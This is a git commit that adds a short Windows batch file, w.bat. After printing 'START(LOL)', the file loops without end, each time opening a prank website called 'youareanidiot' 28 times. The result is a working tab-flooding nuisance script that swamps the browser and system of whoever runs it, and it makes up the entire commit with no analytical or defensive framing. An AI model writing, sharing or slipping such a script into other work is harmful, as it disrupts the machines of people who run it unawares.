0aae7ae86639967c1ec197d272020487b7d061e7
no-neme-user <99588457+no-neme-github@users.noreply.github.com>
2022-06-26 08:16:23 +0900

    Add files via upload

---
+++ w.bat
@@ -0,0 +1,36 @@
+@echo off
+
+echo START(LOL)
+goto 1
+timeout 1
+
+:1
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+start https://fl.youareanidiot.cc/
+goto 1
